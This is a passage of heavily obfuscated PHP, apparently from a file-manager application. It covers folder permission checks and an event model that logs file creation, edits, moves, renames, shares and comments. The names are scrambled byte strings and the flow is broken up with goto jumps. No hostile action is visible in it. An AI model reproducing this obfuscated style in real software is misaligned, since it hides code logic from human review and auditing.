($a”˜∑Æ±›å as $f¡´ù§‚èè) { $D˜æó≥ﬁ£ß = $f¬ÀüÛÇäå->getInfo($f¡´ù§‚èè); $f¢⁄Êû›¯≥[] = $D˜æó≥ﬁ£ß[$Dõ©—çî¥‘[1618]][$Dõ©—çî¥‘[374]]; } $f¢⁄Êû›¯≥ = array_values(array_unique($f¢⁄Êû›¯≥)); goto fÖ‰ÃÛ–õÔ; B≈ª˜Ç„Øà: $a”˜∑Æ±›å = array_values(array_unique($a”˜∑Æ±›å)); $d‹™π©´ÛÃ = $a”˜∑Æ±›å; foreach ($d‹™π©´ÛÃ as $f¡´ù§‚èè) { $D˜æó≥ﬁ£ß = $f¬ÀüÛÇäå->getInfo($f¡´ù§‚èè); $c⁄Éâ£¨æå = $C·º≠∫áçÚ->parentLevelArray($D˜æó≥ﬁ£ß[$Dõ©—çî¥‘[373]]); $a”˜∑Æ±›å = array_merge($a”˜∑Æ±›å, $c⁄Éâ£¨æå); } goto AÒﬁ±Ωä¶µ; aΩéæ»—ú¢: if ($Eﬂñä∞îÊö) { $F¯••ä„π¥ = array(array($Dõ©—çî¥‘[393] => SourceModel::TYPE_USER, $Dõ©—çî¥‘[395] => USER_ID), array($Dõ©—çî¥‘[393] => SourceModel::TYPE_GROUP, $Dõ©—çî¥‘[395] => array($Dõ©—çî¥‘[951], $Eﬂñä∞îÊö)), $Dõ©—çî¥‘[674] => $Dõ©—çî¥‘[1608]); } if ($FÂÏÖ‡›ı†) { $F¯••ä„π¥ = array($F¯••ä„π¥, $Dõ©—çî¥‘[1652] => array($Dõ©—çî¥‘[1667], $FÂÏÖ‡›ı†)); } $cøú“°Îã∆ = $this->field($Dõ©—çî¥‘[1668])->where($F¯••ä„π¥)->select(); goto E¿µç∞ªﬂ£; b≈ê˜≤◊ü˜: } private function makeSourceAuth($CßõÛ„Ò≠∞, $Dáº∑∑Ø¨ﬁ) { goto d„¿ÉÇ∑ÌÈ; Dè’Ì íØÖ: $C‡Û‚≈›¥ó = array_merge(array($CßõÛ„Ò≠∞[$a„≤”ÑõÂñ[374]]), array_reverse($C‡Û‚≈›¥ó)); $C†Ω™∫∞∆Ø = !1; foreach ($C‡Û‚≈›¥ó as $C¨Ó¢çÏäê) { if (!isset($Dáº∑∑Ø¨ﬁ[$C¨Ó¢çÏäê])) { continue; } $eÉŸÌ€ñÀÖ = $this->authMake($Dáº∑∑Ø¨ﬁ[$C¨Ó¢çÏäê]); if ($eÉŸÌ€ñÀÖ[$a„≤”ÑõÂñ[1663]]) { $C†Ω™∫∞∆Ø = $eÉŸÌ€ñÀÖ; break; } } goto EÉí¥ûµæ˜; EÉí¥ûµæ˜: if (!$C†Ω™∫∞∆Ø) { $b∞ºœ™ø∞Ì = array_to_keyvalue($b∞ºœ™ø∞Ì, $a„≤”ÑõÂñ[1516]); $f‰àŸ®á≠› = $CßõÛ„Ò≠∞[$a„≤”ÑõÂñ[395]]; $eÿóèªüÔ = isset($b∞ºœ™ø∞Ì[$f‰àŸ®á≠›]) ? $b∞ºœ™ø∞Ì[$f‰àŸ®á≠›] : !1; if ($eÿóèªüÔ) { $C†Ω™∫∞∆Ø = array($a„≤”ÑõÂñ[1670] => intval($eÿóèªüÔ[$a„≤”ÑõÂñ[548]][$a„≤”ÑõÂñ[548]]), $a„≤”ÑõÂñ[1671] => $eÿóèªüÔ[$a„≤”ÑõÂñ[548]]); } } if ((!$C†Ω™∫∞∆Ø || $C†Ω™∫∞∆Ø[$a„≤”ÑõÂñ[1662]] <= 0) && $CßõÛ„Ò≠∞[$a„≤”ÑõÂñ[393]] == SourceModel::TYPE_GROUP) { $C†Ω™∫∞∆Ø = $this->authDeepCheck($CßõÛ„Ò≠∞[$a„≤”ÑõÂñ[374]], $C†Ω™∫∞∆Ø); } return $C†Ω™∫∞∆Ø; goto DÇÚòë·Óò; d„¿ÉÇ∑ÌÈ: $a„≤”ÑõÂñ =& $_SERVER[∞„˜ƒÑºª]; $b∞ºœ™ø∞Ì = Session::get($a„≤”ÑõÂñ[1636]); $C‡Û‚≈›¥ó = Model($a„≤”ÑõÂñ[832])->parentLevelArray($CßõÛ„Ò≠∞[$a„≤”ÑõÂñ[373]]); goto Dè’Ì íØÖ; DÇÚòë·Óò: } public function authOwnerApply($eøΩ“±ëä∂) { goto bÇπÉ“∞á°; AæÜ°ê´‘©: $eøΩ“±ëä∂[$b±¨óß’‡‰[548]][$b±¨óß’‡‰[1674]] = Model($b±¨óß’‡‰[1675])->userListInfo($b´‹¨Ëì¬§); return $eøΩ“±ëä∂; goto F€¶ãà›ªª; eÒíÜ±⁄Ñ£: $c¥‚‹ —ã… = array($b±¨óß’‡‰[414] => array($b±¨óß’‡‰[951], $dí€‚øÎ‡€)); $b’≠Üû˜Öø = $this->field($bØäﬁ∆Ù‹á)->where($c¥‚‹ —ã…)->select(); $b’≠Üû˜Öø = array_to_keyvalue_group($b’≠Üû˜Öø, $b±¨óß’‡‰[374]); goto a‡Ù·ÆÍΩÇ; DÈÂÓ°œßä: if (count($b´‹¨Ëì¬§) == 0) { $b´‹¨Ëì¬§ = $this->authFolderOwnerGroup($eøΩ“±ëä∂[$b±¨óß’‡‰[395]]); } $b´‹¨Ëì¬§ = array_unique($b´‹¨Ëì¬§); if (AuthModel::authCheckRoot($eøΩ“±ëä∂[$b±¨óß’‡‰[548]][$b±¨óß’‡‰[1662]])) { $b´‹¨Ëì¬§[] = USER_ID; } goto AæÜ°ê´‘©; bÇπÉ“∞á°: $b±¨óß’‡‰ =& $_SERVER[∞„˜ƒÑºª]; if (!$eøΩ“±ëä∂[$b±¨óß’‡‰[548]] || $eøΩ“±ëä∂[$b±¨óß’‡‰[1672]]) { return $eøΩ“±ëä∂; } if (AuthModel::authCheckRoot($eøΩ“±ëä∂[$b±¨óß’‡‰[548]][$b±¨óß’‡‰[1662]])) { return $eøΩ“±ëä∂; } goto E†ã ´§´∞; a‡Ù·ÆÍΩÇ: $a™éÕ‚¬…Á = array(); $b´‹¨Ëì¬§ = array(); foreach ($b’≠Üû˜Öø as $Eú‘Í√“í† => $DõÛî±´·◊) { $E∂∆Õàƒ = $this->authFolderOwnerUser($DõÛî±´·◊); $a™éÕ‚¬…Á[$Eú‘Í√“í†] = $E∂∆Õàƒ; $b´‹¨Ëì¬§ = array_merge($b´‹¨Ëì¬§, $E∂∆Õàƒ[$b±¨óß’‡‰[415]]); if ($E∂∆Õàƒ[$b±¨óß’‡‰[1673]]) { break; } } goto DÈÂÓ°œßä; E†ã ´§´∞: $dí€‚øÎ‡€ = Model($b±¨óß’‡‰[832])->parentLevelArray($eøΩ“±ëä∂[$b±¨óß’‡‰[373]]); $dí€‚øÎ‡€ = array_merge(array($eøΩ“±ëä∂[$b±¨óß’‡‰[374]]), array_reverse($dí€‚øÎ‡€)); $bØäﬁ∆Ù‹á = $b±¨óß’‡‰[1661]; goto eÒíÜ±⁄Ñ£; F€¶ãà›ªª: } private function authFolderOwnerGroup($fÌ°›áàöÍ) { $FÉÉÜûÇœÕ =& $_SERVER[∞„˜ƒÑºª]; $a¨ıôè’è¯ = Model($FÉÉÜûÇœÕ[1600])->where(array($FÉÉÜûÇœÕ[1516] => $fÌ°›áàöÍ))->select(); $f¿É≥ïä´Ê = array(); if (!$a¨ıôè’è¯) { return $f¿É≥ïä´Ê; } foreach ($a¨ıôè’è¯ as $b€Öﬂù√®¶) { $BèŸéìÁªÌ = $this->authInfo($b€Öﬂù√®¶); if (AuthModel::authCheckRoot($BèŸéìÁªÌ[$FÉÉÜûÇœÕ[548]])) { $f¿É≥ïä´Ê[] = $b€Öﬂù√®¶[$FÉÉÜûÇœÕ[1063]]; } } return $f¿É≥ïä´Ê; } private function authFolderOwnerUser($d›Öä»§®›) { $f∫çÕ√Ñøæ =& $_SERVER[∞„˜ƒÑºª]; $bı¢–ª¶ı… = array(); $A¡—¬Îåßê = !1; foreach ($d›Öä»§®› as $EçÑıåëÀë) { $B§Ç¥ùËÑ≠ = $this->authInfo($EçÑıåëÀë); if ($EçÑıåëÀë[$f∫çÕ√Ñøæ[395]] == $f∫çÕ√Ñøæ[402]) { $A¡—¬Îåßê = !0; } if ($EçÑıåëÀë[$f∫çÕ√Ñøæ[393]] == SourceModel::TYPE_USER) { if (AuthModel::authCheckRoot($B§Ç¥ùËÑ≠[$f∫çÕ√Ñøæ[548]])) { $bı¢–ª¶ı…[] = $EçÑıåëÀë[$f∫çÕ√Ñøæ[395]]; } } } return array($f∫çÕ√Ñøæ[415] => $bı¢–ª¶ı…, $f∫çÕ√Ñøæ[1673] => $A¡—¬Îåßê); } public function authMake($d¢êü‰£ÖÙ) { goto aãüÑ¯«æß; AµÉ“çÎïå: $cåÜÙÀçÓ· = 0; foreach ($d¢êü‰£ÖÙ as $FªÏ¨ï∞Ü›) { $F•π¬ìèˆå = $this->authInfo($FªÏ¨ï∞Ü›); $a°é—÷∏Á’ = $FªÏ¨ï∞Ü›[$DÀ”Ù–¨ÓÆ[395]]; $eÎîπá≤Ó» = intval($F•π¬ìèˆå[$DÀ”Ù–¨ÓÆ[548]]); if ($FªÏ¨ï∞Ü›[$DÀ”Ù–¨ÓÆ[393]] == SourceModel::TYPE_USER && $a°é—÷∏Á’ == USER_ID) { $fÀ⁄âÑ≥ö∫ = !0; $d£ä˘åÇãÂ = $F•π¬ìèˆå; $BøŸä‰¶◊è = $eÎîπá≤Ó»; } else { if ($FªÏ¨ï∞Ü›[$DÀ”Ù–¨ÓÆ[393]] == SourceModel::TYPE_GROUP && in_array($a°é—÷∏Á’, $c≠Ü°®Õëñ)) { $F‰•≤·¯∑õ = !0; if ($eÎîπá≤Ó» >= $C™≈çõ·πî) { $C™≈çõ·πî = $eÎîπá≤Ó»; $DƒûçÓ–≠ = $F•π¬ìèˆå; } } else { if ($a°é—÷∏Á’ == 0) { $cåÜÙÀçÓ· = !0; $e“¨ÿË∫’å = $F•π¬ìèˆå; $C‰Ç°‹Ê‹Ê = $eÎîπá≤Ó»; } } } } $cπª´Ë≠∆à = $fÀ⁄âÑ≥ö∫ ? $BøŸä‰¶◊è : ($F‰•≤·¯∑õ ? $C™≈çõ·πî : $C‰Ç°‹Ê‹Ê); goto F¯≥ôÿ ≠í; açòãË“ìˆ: $c≠Ü°®Õëñ = array_to_keyvalue($E‘©Ñ∂â≈µ, $DÀ”Ù–¨ÓÆ[33], $DÀ”Ù–¨ÓÆ[1516]); $BøŸä‰¶◊è = 0; $C™≈çõ·πî = 0; goto DÌóäÙ≥™Ω; AîìË÷ÑÉﬁ: $e“¨ÿË∫’å = 0; $fÀ⁄âÑ≥ö∫ = 0; $F‰•≤·¯∑õ = 0; goto AµÉ“çÎïå; DÌóäÙ≥™Ω: $C‰Ç°‹Ê‹Ê = 0; $d£ä˘åÇãÂ = 0; $DƒûçÓ–≠ = 0; goto AîìË÷ÑÉﬁ; F¯≥ôÿ ≠í: $F•π¬ìèˆå = $fÀ⁄âÑ≥ö∫ ? $d£ä˘åÇãÂ : ($F‰•≤·¯∑õ ? $DƒûçÓ–≠ : $e“¨ÿË∫’å); $bç£—ÿä…ß = array($DÀ”Ù–¨ÓÆ[1670] => intval($cπª´Ë≠∆à), $DÀ”Ù–¨ÓÆ[1671] => $F•π¬ìèˆå); return $bç£—ÿä…ß; goto eéÚ•û«”€; aãüÑ¯«æß: $DÀ”Ù–¨ÓÆ =& $_SERVER[∞„˜ƒÑºª]; if (!$d¢êü‰£ÖÙ) { return array($DÀ”Ù–¨ÓÆ[1662] => 0, $DÀ”Ù–¨ÓÆ[1663] => !1); } $E‘©Ñ∂â≈µ = Session::get($DÀ”Ù–¨ÓÆ[1636]); goto açòãË“ìˆ; eéÚ•û«”€: } public function authTargetInfoMake($d‘ŒÁÙ°Ç∂) { goto EÌï∆≈èÈ—; EÌï∆≈èÈ—: $eÌÑ≤±é∑∫ =& $_SERVER[∞„˜ƒÑºª]; $FòÓÖ∫‘∫Ñ = array(); $f’ËÌ˘è”‚ = array(); goto f¯∆ú›º∏Ó; f¯∆ú›º∏Ó: foreach ($d‘ŒÁÙ°Ç∂ as $e‰Ã∆∏Ûƒ≥) { if ($e‰Ã∆∏Ûƒ≥[$eÌÑ≤±é∑∫[393]] == SourceModel::TYPE_USER) { $FòÓÖ∫‘∫Ñ[] = intval($e‰Ã∆∏Ûƒ≥[$eÌÑ≤±é∑∫[395]]); } else { if ($e‰Ã∆∏Ûƒ≥[$eÌÑ≤±é∑∫[393]] == SourceModel::TYPE_GROUP) { $f’ËÌ˘è”‚[] = intval($e‰Ã∆∏Ûƒ≥[$eÌÑ≤±é∑∫[395]]); } } } if ($FòÓÖ∫‘∫Ñ) { $FòÓÖ∫‘∫Ñ = Model($eÌÑ≤±é∑∫[1675])->userListInfo($FòÓÖ∫‘∫Ñ); } if ($f’ËÌ˘è”‚) { $aêßÏﬂ®ÇÉ = array($eÌÑ≤±é∑∫[1598] => array($eÌÑ≤±é∑∫[951], $f’ËÌ˘è”‚)); $f’ËÌ˘è”‚ = Model($eÌÑ≤±é∑∫[1669])->field($eÌÑ≤±é∑∫[1615])->where($aêßÏﬂ®ÇÉ)->select(); $f’ËÌ˘è”‚ = array_to_keyvalue($f’ËÌ˘è”‚, $eÌÑ≤±é∑∫[1516]); } goto c∞Òè´Ã„; c∞Òè´Ã„: return array($eÌÑ≤±é∑∫[1676] => $FòÓÖ∫‘∫Ñ, $eÌÑ≤±é∑∫[1677] => $f’ËÌ˘è”‚); goto C·⁄ùÇ≈ù; C·⁄ùÇ≈ù: } private function authInfo($AÖ∫πŸ‘¢Ñ) { $F¿ﬂµªÖ´ä =& $_SERVER[∞„˜ƒÑºª]; if ($AÖ∫πŸ‘¢Ñ[$F¿ﬂµªÖ´ä[1652]]) { $CÂ¶‰ªÚ¯Ÿ = Model($F¿ﬂµªÖ´ä[1658])->listData($AÖ∫πŸ‘¢Ñ[$F¿ﬂµªÖ´ä[1652]]); if (!$CÂ¶‰ªÚ¯Ÿ) { return !1; $A§Ï§¢Ëó§ = Model($F¿ﬂµªÖ´ä[1658])->listData(); $eàöùõëÒ´ = array_filter_by_field($A§Ï§¢Ëó§, $F¿ﬂµªÖ´ä[548], $F¿ﬂµªÖ´ä[402]); return $eàöùõëÒ´; } $BÈÚÉ¯≠Üƒ = array_field_key($CÂ¶‰ªÚ¯Ÿ, array($F¿ﬂµªÖ´ä[366], $F¿ﬂµªÖ´ä[28], $F¿ﬂµªÖ´ä[548], $F¿ﬂµªÖ´ä[1534], $F¿ﬂµªÖ´ä[1537])); $BÈÚÉ¯≠Üƒ[$F¿ﬂµªÖ´ä[1678]] = $AÖ∫πŸ‘¢Ñ; return $BÈÚÉ¯≠Üƒ; } else { return array($F¿ﬂµªÖ´ä[794] => 0, $F¿ﬂµªÖ´ä[1522] => $AÖ∫πŸ‘¢Ñ[$F¿ﬂµªÖ´ä[1653]], $F¿ﬂµªÖ´ä[387] => $F¿ﬂµªÖ´ä[33], $F¿ﬂµªÖ´ä[1534] => $F¿ﬂµªÖ´ä[1679]); } } } class SourceEventModel extends ModelBase { protected $tableName = "\151\x6f\x5f\x73\x6f\165\162\x63\145\137\145\166\145\156\164"; protected $dataAuto = array(array("\x63\162\145\x61\x74\145\124\x69\x6d\145", "\x74\151\155\x65", "\x69\156\163\145\162\x74", "\146\165\x6e\143\x74\151\x6f\x6e"), array("\144\145\x73\x63", '', "\151\156\x73\x65\x72\164\x2c\x75\160\x64\x61\x74\x65\x2c\163\x65\x6c\x65\143\164", "\x6a\x73\x6f\x6e")); public function addEvent($cùÉ≈ıÖÛ», $c“™¨÷úßº, $D¬ÿéõÈœé = '') { goto E°ó™ÈÙƒÑ; BŒûâ¯îÈÓ: return $this->add($eŸ⁄ì…ﬁËñ); goto d±⁄¬ÙÔãé; E°ó™ÈÙƒÑ: $déÀ®‡èíØ =& $_SERVER[∞„˜ƒÑºª]; $B∏’¶Ñû†∏ = Model($déÀ®‡èíØ[832])->sourceInfo($cùÉ≈ıÖÛ»); if (!$B∏’¶Ñû†∏) { return !1; } goto A›≤Ì√ìÙÔ; A›≤Ì√ìÙÔ: if ($D¬ÿéõÈœé && is_string($D¬ÿéõÈœé)) { $D¬ÿéõÈœé = array($déÀ®‡èíØ[1547] => $D¬ÿéõÈœé); } $eŸ⁄ì…ﬁËñ = array($déÀ®‡èíØ[414] => $cùÉ≈ıÖÛ», $déÀ®‡èíØ[1680] => $B∏’¶Ñû†∏[$déÀ®‡èíØ[384]], $déÀ®‡èíØ[1054] => USER_ID, $déÀ®‡èíØ[792] => $c“™¨÷úßº, $déÀ®‡èíØ[1056] => $D¬ÿéõÈœé); $this->addSystemLog($c“™¨÷úßº, $eŸ⁄ì…ﬁËñ); goto BŒûâ¯îÈÓ; d±⁄¬ÙÔãé: } private function addSystemLog($bÍ∂Õ£ë¯, $aèÖòóÏ∑–) { $fÎî›€⁄î… =& $_SERVER[∞„˜ƒÑºª]; if ($bÍ∂Õ£ë¯ == $fÎî›€⁄î…[1681]) { $bÍ∂Õ£ë¯ = $aèÖòóÏ∑–[$fÎî›€⁄î…[1560]][$fÎî›€⁄î…[1682]]; } else { if (in_array($bÍ∂Õ£ë¯, array($fÎî›€⁄î…[1493], $fÎî›€⁄î…[1683]))) { $bÍ∂Õ£ë¯ = $aèÖòóÏ∑–[$fÎî›€⁄î…[1560]][$fÎî›€⁄î…[448]]; } } $D¬Ø”ÃıÍﬁ = array_merge($aèÖòóÏ∑–, array($fÎî›€⁄î…[1684] => $aèÖòóÏ∑–[$fÎî›€⁄î…[374]], $fÎî›€⁄î…[1685] => $aèÖòóÏ∑–[$fÎî›€⁄î…[1685]])); Model($fÎî›€⁄î…[1457])->addLog($fÎî›€⁄î…[1686] . $bÍ∂Õ£ë¯, $D¬Ø”ÃıÍﬁ); } public function eventCreate($b’ﬁùÛ“Áª, $F˜ÏñÍÑÜ¢) { $BÈ÷£´Ù≠ú =& $_SERVER[∞„˜ƒÑºª]; $cåÇâ¶ãáú = Model($BÈ÷£´Ù≠ú[832])->sourceInfo($b’ﬁùÛ“Áª); $cœΩÈàßÖ§ = array($BÈ÷£´Ù≠ú[1682] => $F˜ÏñÍÑÜ¢, $BÈ÷£´Ù≠ú[28] => $cåÇâ¶ãáú[$BÈ÷£´Ù≠ú[28]]); return $this->addEvent($b’ﬁùÛ“Áª, $BÈ÷£´Ù≠ú[1681], $cœΩÈàßÖ§); } public function eventFileEdit($Eäπ—ûßó∏) { return $this->addEvent($Eäπ—ûßó∏, $_SERVER[∞„˜ƒÑºª][1485]); } public function eventRecycle($a  …óñ‹∂, $f¥≠ïƒãá„) { return $this->addEvent($a  …óñ‹∂, $_SERVER[∞„˜ƒÑºª][1683], $f¥≠ïƒãá„); } public function eventRemove($c≤üæÉñáï) { $A√ïä‘õ∏∞ =& $_SERVER[∞„˜ƒÑºª]; $bΩÎµ¯†çâ = Model($A√ïä‘õ∏∞[832])->sourceInfo($c≤üæÉñáï); $d√¶êåŒ„È = $bΩÎµ¯†çâ[$A√ïä‘õ∏∞[28]]; return $this->addEvent($bΩÎµ¯†çâ[$A√ïä‘õ∏∞[384]], $A√ïä‘õ∏∞[368], $d√¶êåŒ„È); } public function eventShare($e’¿¶„ûË“, $cÂ⁄¥å´ÖÜ) { return $this->addEvent($e’¿¶„ûË“, $_SERVER[∞„˜ƒÑºª][1493], $cÂ⁄¥å´ÖÜ); } public function eventMove($bÉµçùâÜ∏, $EÇâåã∏ÛÁ, $d¿›¬ç”ﬁ€) { goto F÷ñ÷É¡◊à; F÷ñ÷É¡◊à: $c÷û¶êëì =& $_SERVER[∞„˜ƒÑºª]; $fÃ§”∑—Óƒ = Model($c÷û¶êëì[832]); $bÉØ´≈⁄ÿ˜ = $fÃ§”∑—Óƒ->sourceInfo($bÉµçùâÜ∏); goto F¯ü™µ⁄É∂; DëçäïÚ„æ: $this->addEvent($EÇâåã∏ÛÁ, $c÷û¶êëì[1689], $D¯¿πãÉõ∞); goto aîÇ‹äáê¨; F¯ü™µ⁄É∂: $eôõ∏•¬ßÖ = $fÃ§”∑—Óƒ->sourceInfo($EÇâåã∏ÛÁ); $AéÃö“Ωù… = $fÃ§”∑—Óƒ->sourceInfo($d¿›¬ç”ﬁ€); $D¯¿πãÉõ∞ = array($c÷û¶êëì[740] => $EÇâåã∏ÛÁ, $c÷û¶êëì[1687] => $eôõ∏•¬ßÖ[$c÷û¶êëì[28]], $c÷û¶êëì[741] => $d¿›¬ç”ﬁ€, $c÷û¶êëì[1688] => $AéÃö“Ωù…[$c÷û¶êëì[28]]); goto aﬁ±µ¥¢ï‰; aﬁ±µ¥¢ï‰: $this->addEvent($bÉµçùâÜ∏, $c÷û¶êëì[734], $D¯¿πãÉõ∞); $bÉØ´≈⁄ÿ˜ = $fÃ§”∑—Óƒ->sourceInfo($bÉµçùâÜ∏); $D¯¿πãÉõ∞ = array($c÷û¶êëì[374] => $bÉØ´≈⁄ÿ˜[$c÷û¶êëì[374]], $c÷û¶êëì[28] => $bÉØ´≈⁄ÿ˜[$c÷û¶êëì[28]]); goto DëçäïÚ„æ; aîÇ‹äáê¨: } public function eventCopy($c⁄·Á™ÓÚÇ) { $this->eventCreate($c⁄·Á™ÓÚÇ, $_SERVER[∞„˜ƒÑºª][733]); } public function eventRename($Dûœ≤Ü¡Õ´, $Dù‚ÇÓ¨àÓ, $E“›ªÕÉ π) { $cê∑’«ñ‘ =& $_SERVER[∞„˜ƒÑºª]; $EøÒÂã“‚… = array($cê∑’«ñ‘[740] => $Dù‚ÇÓ¨àÓ, $cê∑’«ñ‘[741] => $E“›ªÕÉ π); return $this->addEvent($Dûœ≤Ü¡Õ´, $cê∑’«ñ‘[1690], $EøÒÂã“‚…); } public function eventAddComment($A¿…ãæ…Ÿœ, $c …èìå√®) { return $this->addEvent($A¿…ãæ…Ÿœ, $_SERVER[∞„˜ƒÑºª][1691], $c …èìå√®); } public function eventAddDesc($F¿ÂÆ≤œŸû, $EÊúâÚè…É) { return $this->addEvent($F¿ÂÆ≤œŸû, $_SERVER[∞„˜ƒÑºª][1692], $EÊúâÚè…É); } public function listBySource($CÇ¿≥Ÿ≥Ù) { goto EÎ™ú–£ÑÎ; EÎ™ú–£ÑÎ: $B†å˜ô»Ëæ =& $_SERVER[∞„˜ƒÑºª]; $eéóÍúàîÂ = Model($B†å˜ô»Ëæ[832])->sourceInfo($CÇ¿≥Ÿ≥Ù); $B‘Ñ¥åêÉÚ = array($B†å˜ô»Ëæ[414] => $CÇ¿≥Ÿ≥Ù); goto DÃë¿ÿ¯ŸΩ; Aëà¡Õäƒ≥: $e≈Ÿ™Ü–∏• = $this->eventListParse($e≈Ÿ™Ü–∏•, $CÇ¿≥Ÿ≥Ù); show_json($e≈Ÿ™Ü–∏•); goto cØ€…æÃûå; DÃë¿ÿ¯ŸΩ: if ($eéóÍúàîÂ[$B†å˜ô»Ëæ[375]] == $B†å˜ô»Ëæ[376]) { $B¶ãÒâàÜé = Model($B†å˜ô»Ëæ[832])->listSearchChildren($CÇ¿≥Ÿ≥Ù, 20000); $B¶ãÒâàÜé[] = $CÇ¿≥Ÿ≥Ù; $B‘Ñ¥åêÉÚ = array($B†å˜ô»Ëæ[374] => array($B†å˜ô»Ëæ[7], $B¶ãÒâàÜé)); } $e≈Ÿ™Ü–∏• = $this->where($B‘Ñ¥åêÉÚ)->order($B†å˜ô»Ëæ[1693])->selectPage(); if ($e≈Ÿ™Ü–∏•[$B†å˜ô»Ëæ[351]][$B†å˜ô»Ëæ[352]] == 0) { $e≈Ÿ™Ü–∏•[$B†å˜ô»Ëæ[351]][$B†å˜ô»Ëæ[352]] = 1; $e≈Ÿ™Ü–∏•[$B†å˜ô»Ëæ[354]] = array(array($B†å˜ô»Ëæ[414] => $CÇ¿≥Ÿ≥Ù, $B†å˜ô»Ëæ[1680] => $eéóÍúàîÂ[$B†å˜ô»Ëæ[384]], $B†å˜ô»Ëæ[1054] => $eéóÍúàîÂ[$B†å˜ô»Ëæ[1694]], $B†å˜ô»Ëæ[792] => $B†å˜ô»Ëæ[1695], $B†å˜ô»Ëæ[1557] => $eéóÍúàîÂ[$B†å˜ô»Ëæ[183]], $B†å˜ô»Ëæ[1056] => $B†å˜ô»Ëæ[33])); } goto Aëà¡Õäƒ≥; cØ€…æÃûå: } private function eventListParse($cΩÁΩÕ‚∂å, $d∞óÎ‰“Ö∂) { goto A∂ú€éŒ¬¶; A∂ú€éŒ¬¶: $Aà∑çÜ«⁄∞ =& $_SERVER[∞„˜ƒÑºª]; $D¿ãîüÈÓÜ = $cΩÁΩÕ‚∂å[$Aà∑çÜ«⁄∞[354]]; $c€úπ˜Èàï = array_to_keyvalue($D¿ãîüÈÓÜ, $Aà∑çÜ«⁄∞[33], $Aà∑çÜ«⁄∞[374]); goto aâîáã–çÉ; D⁄€ÉË˜ã◊: $cΩÁΩÕ‚∂å[$Aà∑çÜ«⁄∞[354]] = $D¿ãîüÈÓÜ; return $cΩÁΩÕ‚∂å; goto f∫œ≈—é∏∑; Fè˘‚‘çÖÕ: $cô Ãã«ßÉ = Model($Aà∑çÜ«⁄∞[1451])->userListInfo($DËØØ„±ëÔ); $døò˘ãèÉ” = Model($Aà∑çÜ«⁄∞[520])->sourceListInfo($c€úπ˜Èàï, !0); foreach ($D¿ãîüÈÓÜ as &$CÉôÜëÒˆ») { goto f—≥π∏∞íé; DÊûØ”¢Ï⁄: $CÉôÜëÒˆ»[$Aà∑çÜ«⁄∞[1655]] = $cô Ãã«ßÉ[$CÉôÜëÒˆ»[$Aà∑çÜ«⁄∞[1063]]]; goto aÖ–°åó˘ë; d ¯ÙÑ⁄ùÿ: $CÉôÜëÒˆ»[$Aà∑çÜ«⁄∞[1618]] = $døò˘ãèÉ”[$CÉôÜëÒˆ»[$Aà∑çÜ«⁄∞[374]]]; $CÉôÜëÒˆ»[$Aà∑çÜ«⁄∞[1696]] = $døò˘ãèÉ”[$CÉôÜëÒˆ»[$Aà∑çÜ«⁄∞[1685]]]; if ($CÉôÜëÒˆ»[$Aà∑çÜ«⁄∞[29]] == $Aà∑çÜ«⁄∞[368]) { $CÉôÜëÒˆ»[$Aà∑çÜ«⁄∞[1696]] = $CÉôÜëÒˆ»[$Aà∑çÜ«⁄∞[1618]]; $CÉôÜëÒˆ»[$Aà∑çÜ«⁄∞[1685]] = $CÉôÜëÒˆ»[$Aà∑çÜ«⁄∞[1696]][$Aà∑çÜ«⁄∞[374]]; $CÉôÜëÒˆ»[$Aà∑çÜ«⁄∞[1618]] = !1; $CÉôÜëÒˆ»[$Aà∑çÜ«⁄∞[374]] = $Aà∑çÜ«⁄∞[33]; } goto DÊûØ”¢Ï⁄; f—≥π∏∞íé: $cü˘ÊÀÊÉî =& $CÉôÜëÒˆ»[$Aà∑çÜ«⁄∞[1560]]; if ($CÉôÜëÒˆ»[$Aà∑çÜ«⁄∞[29]] == $Aà∑çÜ«⁄∞[734] && isset($cü˘ÊÀÊÉî[$Aà∑çÜ«⁄∞[740]])) { $cü˘ÊÀÊÉî[$Aà∑çÜ«⁄∞[740]] = $døò˘ãèÉ”[$cü˘ÊÀÊÉî[$Aà∑çÜ«⁄∞[740]]]; $cü˘ÊÀÊÉî[$Aà∑çÜ«⁄∞[741]] = $døò˘ãèÉ”[$cü˘ÊÀÊÉî[$Aà∑çÜ«⁄∞[741]]]; } if ($CÉôÜëÒˆ»[$Aà∑çÜ«⁄∞[29]] == $Aà∑çÜ«⁄∞[1689] && isset($cü˘ÊÀÊÉî[$Aà∑çÜ«⁄∞[374]])) { $cü˘ÊÀÊÉî[$Aà∑çÜ«⁄∞[374]] = $døò˘ãèÉ”[$cü˘ÊÀÊÉî[$Aà∑çÜ«⁄∞[374]]]; } goto d ¯ÙÑ⁄ùÿ; aÖ–°åó˘ë: } goto D⁄€ÉË˜ã◊; c√ÿ¿π‘ª: $c€úπ˜Èàï = array_filter(array_unique($c€úπ˜Èàï)); $DËØØ„±ëÔ = array_to_keyvalue($D¿ãîüÈÓÜ, $Aà∑çÜ«⁄∞[33], $Aà∑çÜ«⁄∞[1063]); $DËØØ„±ëÔ = array_filter(array_unique($DËØØ„±ëÔ)); goto Fè˘‚‘çÖÕ; aâîáã–çÉ: $c·Õ√‚ëÈá = array_to_keyvalue($D¿ãîüÈÓÜ, $Aà∑çÜ«⁄∞[33], $Aà∑çÜ«⁄∞[1685]); foreach ($D¿ãîüÈÓÜ as $CÉôÜëÒˆ») { $cü˘ÊÀÊÉî = $CÉôÜëÒˆ»[$Aà∑çÜ«⁄∞[1560]]; if ($CÉôÜëÒˆ»[$Aà∑çÜ«⁄∞[29]] == $Aà∑çÜ«⁄∞[734] && isset($cü˘ÊÀÊÉî[$Aà∑çÜ«⁄∞[740]])) { $c€úπ˜Èàï[] = $cü˘ÊÀÊÉî[$Aà∑çÜ«⁄∞[740]]; $c€úπ˜Èàï[] = $cü˘ÊÀÊÉî[$Aà∑çÜ«⁄∞[741]]; } if ($CÉôÜëÒˆ»[$Aà∑çÜ«⁄∞[29]] == $Aà∑çÜ«⁄∞[1689] && isset($cü˘ÊÀÊÉî[$Aà∑çÜ«⁄∞[374]])) { $c€úπ˜Èàï[] = $cü˘ÊÀÊÉî[$Aà∑çÜ«⁄∞[374]]; } } $c€úπ˜Èàï = array_merge($c€úπ˜Èàï, $c·Õ√‚ëÈá, array($d∞óÎ‰“Ö∂)); goto c√ÿ¿π‘ª; f∫œ≈—é∏∑: } public function removeBySource($F‡µÔÜ¥†Ç) { $F∞‚ÁØáöö = array($_SERVER[∞„˜ƒÑºª][414] => $F‡µÔÜ¥†Ç); $this->where($F∞‚ÁØáöö)->remove(); } } define($_SERVER[∞„˜ƒÑºª][1697], 